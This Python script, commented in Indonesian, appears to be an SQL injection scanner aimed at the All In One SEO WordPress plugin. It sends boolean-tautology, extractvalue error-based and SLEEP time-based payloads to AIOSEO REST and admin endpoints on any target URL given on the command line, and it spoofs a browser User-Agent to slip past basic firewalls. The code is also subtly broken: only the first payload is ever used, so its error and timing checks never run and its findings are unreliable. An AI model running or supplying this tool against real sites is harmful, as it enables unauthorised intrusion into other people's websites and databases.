# aioseo_sqli_probe.py
# Mode: PROBE (Low Risk)
# Tujuan: Mendeteksi kerentanan SQL Injection pada plugin All In One SEO (AIOSEO)
# Metode: Error-based probing & Time-based logic verification
# Author: Dwi Joko Purwanto 

import requests
import time
import json
import logging
from urllib.parse import quote
from typing import Optional, Tuple

# Konfigurasi Logging Standar
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AIOSEOSQLiProbe:
    """
    Probe khusus untuk mendeteksi SQLi pada endpoint AIOSEO.
    Fokus pada deteksi error message atau anomali waktu/logika.
    """

    def __init__(self, target_url: str, timeout: int = 10):
        self.target_url = target_url.rstrip('/')
        self.timeout = timeout
        self.session = requests.Session()
        # Header standar browser untuk menghindari WAF dasar
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })
        # String unik untuk melacak payload di response
        self.probe_string = f"AIOSEO_SQLI_PROBE_{int(time.time())}"
        self.results = []

    def _build_payload(self, injection_point: str, param_name: str = 'id') -> dict:
        """
        Membangun payload SQLi standar yang aman untuk probe.
        Menggunakan teknik union/select sederhana atau error trigger.
        """
        # Payload umum untuk menguji apakah parameter rentan terhadap SQL syntax error
        # Contoh: ' OR '1'='1 -- 
        # Atau lebih halus: ', (SELECT SLEEP(1))--
        
        payloads = [
            {
                "name": "Basic Boolean Logic",
                "value": f"' OR '{self.probe_string}'='{self.probe_string}",
                "expected_behavior": "Response should contain probe_string or behave normally if injected correctly"
            },
            {
                "name": "Error Trigger (MySQL)",
                "value": f"', (SELECT extractvalue(1, concat(0x7e, version())))--",
                "expected_behavior": "Should return an XML/XPath error containing DB version if vulnerable"
            },
            {
                "name": "Time Delay (Blind Check)",
                "value": f"AND (SELECT SLEEP(2))>0",
                "expected_behavior": "Response time should increase by ~2 seconds"
            }
        ]
        
        # Mengembalikan payload yang sesuai dengan injection point (GET/POST/Header)
        # Untuk AIOSEO, sering kali melalui parameter GET atau POST form fields
        return payloads[0] # Default ke basic boolean untuk kecepatan

    def _send_request(self, url: str, params: dict = None, data: dict = None) -> Tuple[requests.Response, float]:
        """
        Mengirim request dan mengukur waktu respons.
        """
        start_time = time.time()
        try:
            response = self.session.get(url, params=params, data=data, timeout=self.timeout)
            end_time = time.time()
            duration = end_time - start_time
            return response, duration
        except requests.exceptions.RequestException as e:
            logger.error(f"Request failed: {e}")
            return None, 0

    def probe_endpoint(self, endpoint_path: str, param_name: str = 'id') -> dict:
        """
        Melakukan probe pada endpoint tertentu.
        """
        base_url = f"{self.target_url}{endpoint_path}"
        results = {
            "endpoint": base_url,
            "param": param_name,
            "vulnerable": False,
            "details": [],
            "timestamp": time.strftime('%Y-%m-%d %H:%M:%S')
        }

        # 1. Baseline Request (Normal)
        baseline_resp, baseline_time = self._send_request(base_url)
        if not baseline_resp:
            results["details"].append("Could not reach baseline endpoint.")
            return results

        baseline_status = baseline_resp.status_code
        baseline_body_len = len(baseline_resp.text)
        baseline_time_taken = baseline_time

        # 2. Probing dengan Payload
        payload_data = self._build_payload(endpoint_path, param_name)
        
        # Variasi: Inject ke dalam parameter URL
        test_params = {param_name: payload_data['value']}
        resp, duration = self._send_request(base_url, params=test_params)
        
        if not resp:
            results["details"].append("Failed to send probe payload.")
            return results

        # Analisis Hasil
        is_vuln = False
        findings = []

        # Cek 1: Error Message Injection
        if payload_data['name'] == "Error Trigger (MySQL)":
            if self.probe_string in resp.text or "extractvalue" in resp.text.lower() or "XPATH" in resp.text.upper():
                is_vuln = True
                findings.append(f"Error-based SQLi detected. Response contains trace info.")
        
        # Cek 2: Content Change / Logic Bypass
        elif payload_data['name'] == "Basic Boolean Logic":
            # Jika payload benar, konten seharusnya berubah atau tetap sama tergantung logika app
            # Tapi jika ada error, status code bisa berubah (misal dari 200 ke 500)
            if resp.status_code != baseline_status and resp.status_code >= 500:
                is_vuln = True
                findings.append(f"Status code changed from {baseline_status} to {resp.status_code}, indicating possible SQL syntax error.")
            
            # Cek jika probe_string muncul di response (jika app echo back input)
            if self.probe_string in resp.text:
                is_vuln = True
                findings.append(f"Input reflection detected. Probe string found in response body.")

        # Cek 3: Time Delay (Blind SQLi)
        elif payload_data['name'] == "Time Delay (Blind Check)":
            # Bandingkan waktu dengan baseline
            # Jika waktu > baseline + delay_time (dengan toleransi jaringan)
            threshold = baseline_time + 1.5 # Toleransi 1.5 detik dari baseline normal
            if duration > threshold:
                is_vuln = True
                findings.append(f"Time-based SQLi suspected. Duration: {duration:.2f}s (Baseline: {baseline_time_taken:.2f}s)")

        # Update Results
        results["vulnerable"] = is_vuln
        results["findings"] = findings
        results["baseline_status"] = baseline_status
        results["probe_status"] = resp.status_code
        results["baseline_time"] = round(baseline_time_taken, 4)
        results["probe_time"] = round(duration, 4)
        
        # Simpan hasil untuk laporan akhir
        self.results.append(results)
        
        if is_vuln:
            logger.warning(f"[VULNERABLE] {base_url} - Param: {param_name}")
        else:
            logger.info(f"[CLEAN] {base_url} - Param: {param_name}")

        return results

    def run_full_probe(self, endpoints: list) -> list:
        """
        Menjalankan probe pada daftar endpoint yang ditentukan.
        Endpoint contoh untuk AIOSEO:
        - /wp-json/aioseo/v1/settings/general
        - /wp-json/aioseo/v1/sitemap/status
        - /wp-admin/admin.php?page=aioseo_general_settings
        """
        logger.info(f"Starting AIOSEO SQLi Probe on {self.target_url}")
        
        for ep in endpoints:
            # Biasanya parameter seperti 'id', 'page', 'tab', 'action' rentan
            # Kita coba beberapa parameter umum
            params_to_test = ['id', 'page', 'tab', 'action', 'post_id']
            
            for param in params_to_test:
                res = self.probe_endpoint(ep, param)
                
        return self.results

    def get_report(self) -> dict:
        """
        Mengembalikan laporan dalam format JSON siap pakai.
        """
        report = {
            "tool": "AIOSEO_SQLi_Probe",
            "target": self.target_url,
            "total_endpoints_tested": len(self.results),
            "vulnerable_endpoints": sum(1 for r in self.results if r['vulnerable']),
            "details": self.results
        }
        return report

# Contoh Penggunaan CLI Sederhana
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python aioseo_sqli_probe.py <target_url>")
        sys.exit(1)

    target = sys.argv[1]
    
    # Definisi endpoint umum AIOSEO yang mungkin rentan
    # Perhatikan: Path harus valid berdasarkan instalasi WP target
    common_aioseo_endpoints = [
        "/wp-json/aioseo/v1/settings/general",
        "/wp-json/aioseo/v1/sitemap/status",
        "/wp-json/aioseo/v1/analytics/dashboard",
        "/wp-admin/admin.php?page=aioseo_general_settings"
    ]
    
    probe = AIOSEOSQLiProbe(target)
    results = probe.run_full_probe(common_aioseo_endpoints)
    
    report = probe.get_report()
    print(json.dumps(report, indent=2))